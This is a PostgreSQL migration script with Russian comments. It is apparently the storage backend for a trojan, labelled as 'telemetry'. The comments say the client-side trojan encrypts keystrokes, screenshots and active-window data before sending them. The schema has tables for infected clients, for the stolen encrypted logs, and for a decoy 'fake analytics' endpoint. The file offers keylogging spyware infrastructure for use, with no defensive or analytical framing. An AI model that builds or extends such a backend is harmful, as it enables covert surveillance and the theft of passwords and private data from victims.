-- Миграция для модуля телеметрии v2 (Render PostgreSQL)
-- КРИТИЧНО: Сервер НЕ расшифровывает данные, только хранит зашифрованный payload
-- Все данные шифруются на клиенте (троян) перед отправкой

-- Включаем расширения
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
CREATE EXTENSION IF NOT EXISTS "pgcrypto";

-- Удаление старых таблиц (если существуют)
DROP TABLE IF EXISTS telemetry_logs CASCADE;
DROP TABLE IF EXISTS fake_analytics_logs CASCADE;
DROP TABLE IF EXISTS encryption_keys CASCADE;

-- Таблица для маппинга клиентов
CREATE TABLE IF NOT EXISTS telemetry_clients (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  client_public_key_hash VARCHAR(64) NOT NULL UNIQUE, -- SHA256(client_public_key) для идентификации
  client_public_key TEXT NOT NULL, -- PEM формат публичного ключа клиента
  response_key_encrypted BYTEA NOT NULL, -- response_key зашифрован публичным ключом клиента (RSA-OAEP)
  first_seen TIMESTAMPTZ DEFAULT NOW(),
  last_seen TIMESTAMPTZ DEFAULT NOW(),
  is_active BOOLEAN DEFAULT true
);

CREATE INDEX IF NOT EXISTS idx_telemetry_clients_key_hash ON telemetry_clients(client_public_key_hash);
CREATE INDEX IF NOT EXISTS idx_telemetry_clients_last_seen ON telemetry_clients(last_seen);
CREATE INDEX IF NOT EXISTS idx_telemetry_clients_active ON telemetry_clients(is_active);

-- Основная таблица с зашифрованными данными
-- КРИТИЧНО: encrypted_payload содержит ВСЁ (keystrokes, screenshot, active_window и т.д.)
-- Данные зашифрованы AES-GCM на клиенте с response_key
CREATE TABLE IF NOT EXISTS telemetry_logs (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  client_id UUID REFERENCES telemetry_clients(id) ON DELETE CASCADE,
  timestamp TIMESTAMPTZ NOT NULL,
  encrypted_payload BYTEA NOT NULL, -- AES-GCM зашифрованные данные (весь JSON payload)
  payload_size INTEGER NOT NULL,
  received_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_telemetry_logs_client ON telemetry_logs(client_id);
CREATE INDEX IF NOT EXISTS idx_telemetry_logs_timestamp ON telemetry_logs(timestamp);
CREATE INDEX IF NOT EXISTS idx_telemetry_logs_received_at ON telemetry_logs(received_at);

-- Таблица для фейкового эндпоинта /api/analytics
CREATE TABLE IF NOT EXISTS fake_analytics_logs (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  data JSONB,
  received_at TIMESTAMPTZ DEFAULT NOW()
);
